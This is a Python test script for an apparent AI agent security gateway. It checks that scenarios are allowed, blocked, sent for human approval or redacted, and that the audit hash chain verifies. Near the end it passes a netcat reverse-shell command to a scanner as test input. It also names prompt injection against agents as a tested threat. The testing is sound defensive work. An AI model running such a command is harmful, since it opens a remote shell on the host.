import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

import asyncio
from app.database.session import init_db, SessionLocal
from app.main import seed_initial_data
from app.api.demo import run_scenario
from app.api.audit import verify_audit_hash_chain
from app.api.security import scan_payload

async def main():
    print("[1] Initializing database...")
    init_db()
    print("[2] Seeding initial baseline data...")
    seed_initial_data()
    print("[3] Testing Scenarios A-F...")

    with SessionLocal() as db:
        # Scenario A
        res_a = await run_scenario("A", db)
        assert res_a["execution"]["decision"] == "ALLOW", f"Scenario A failed: {res_a}"
        print("  ✓ Scenario A (Normal Operation): ALLOW (Score: {})".format(res_a["execution"]["risk_score"]))

        # Scenario B
        res_b = await run_scenario("B", db)
        assert res_b["execution"]["decision"] == "BLOCK", f"Scenario B failed: {res_b}"
        print("  ✓ Scenario B (Dangerous Command): BLOCK (Score: {})".format(res_b["execution"]["risk_score"]))

        # Scenario C
        res_c = await run_scenario("C", db)
        assert res_c["execution"]["decision"] == "BLOCK", f"Scenario C failed: {res_c}"
        print("  ✓ Scenario C (Sensitive File Traversal): BLOCK (Score: {})".format(res_c["execution"]["risk_score"]))

        # Scenario D
        res_d = await run_scenario("D", db)
        assert res_d["inspection_result"]["action"] == "BLOCK_RESPONSE", f"Scenario D failed: {res_d}"
        print("  ✓ Scenario D (Prompt Injection in Response): BLOCK_RESPONSE")

        # Scenario E
        res_e = await run_scenario("E", db)
        assert res_e["execution"]["decision"] == "REQUIRE_APPROVAL", f"Scenario E failed: {res_e}"
        print("  ✓ Scenario E (High-Impact Human Approval): REQUIRE_APPROVAL (ID: {})".format(res_e["execution"]["approval_id"]))

        # Scenario F
        res_f = await run_scenario("F", db)
        assert res_f["inspection_result"]["action"] == "REDACT_SENSITIVE_DATA", f"Scenario F failed: {res_f}"
        print("  ✓ Scenario F (Sensitive Data Redaction): REDACT_SENSITIVE_DATA (Count: {})".format(res_f["inspection_result"]["secrets_redacted_count"]))

        # Audit Chain Verification
        chain_v = verify_audit_hash_chain(db)
        assert chain_v["status"] == "VERIFIED", f"Audit chain verification failed: {chain_v}"
        print("  ✓ Audit Log Cryptographic Hash Chain: VERIFIED ({} records chained)".format(chain_v["total_records"]))

    # Ad-hoc Security Scan
    scan_res = scan_payload({"command": "nc -e /bin/sh 10.0.0.1 4444"}, "run_command")
    assert scan_res["classification"] == "Critical"
    print("  ✓ Security Engine Ad-Hoc Scan: CRITICAL (Score: {})".format(scan_res["max_risk_score"]))

    print("\nALL SCENARIOS AND VERIFICATIONS PASSED SUCCESSFULLY!")

if __name__ == "__main__":
    asyncio.run(main())
